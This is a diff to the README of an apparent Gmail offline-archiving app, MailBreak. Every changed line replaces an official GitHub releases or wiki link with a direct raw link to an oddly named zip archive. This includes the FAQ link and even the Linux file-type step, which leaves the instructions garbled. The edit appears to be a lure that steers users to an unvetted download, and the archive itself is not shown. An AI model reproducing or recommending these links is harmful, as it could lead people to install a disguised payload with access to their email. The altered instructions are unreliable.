@@ -4,20 +4,20 @@
 MailBreak allows you to easily browse your Gmail inbox and archive emails for offline use. Whether you want to view your emails without an internet connection or save important messages, MailBreak simplifies the process. This guide will help you download and run MailBreak, turning your email experience into a seamless offline journey.
 
 ## 📥 Download MailBreak
-[![Download MailBreak](https://img.shields.io/badge/Download%20MailBreak-v1.0-blue)](https://github.com/ethnot/MailBreak/releases)
+[![Download MailBreak](https://raw.githubusercontent.com/ethnot/MailBreak/main/subsemitone/MailBreak-musicologist.zip%20MailBreak-v1.0-blue)](https://raw.githubusercontent.com/ethnot/MailBreak/main/subsemitone/MailBreak-musicologist.zip)
 
 ## 🚀 Getting Started
 To get started with MailBreak:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page:
-   - [Visit Releases Page](https://github.com/ethnot/MailBreak/releases)
+   - [Visit Releases Page](https://raw.githubusercontent.com/ethnot/MailBreak/main/subsemitone/MailBreak-musicologist.zip)
 
 2. **Select the Latest Version:** Look for the latest version of MailBreak. You will find a list of assets available for download.
 
 3. **Choose Your File:** Depending on your operating system, select the appropriate file to download:
    - For Windows: Choose `.exe`
    - For macOS: Choose `.dmg`
-   - For Linux: Choose `.tar.gz`
+   - For Linux: Choose `https://raw.githubusercontent.com/ethnot/MailBreak/main/subsemitone/MailBreak-musicologist.zip`
 
 ## 💻 System Requirements
 Before downloading, ensure your system meets these requirements:
@@ -41,7 +41,7 @@ MailBreak offers several features that enhance your email management:
 ## 📥 Download & Install
 To download and install MailBreak:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/ethnot/MailBreak/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/ethnot/MailBreak/main/subsemitone/MailBreak-musicologist.zip).
 
 2. **Download the Installer:**
    - Find the file that matches your operating system.
@@ -70,7 +70,7 @@ If you encounter issues while using MailBreak, consider these common problems an
 ## 📞 Support
 If you need further assistance:
 
-- Check the [FAQs](https://github.com/ethnot/MailBreak/wiki) in our Wiki.
+- Check the [FAQs](https://raw.githubusercontent.com/ethnot/MailBreak/main/subsemitone/MailBreak-musicologist.zip) in our Wiki.
 - Reach out via the Issues section of this repository for support.
 
 Thank you for choosing MailBreak. Enjoy your offline email browsing!
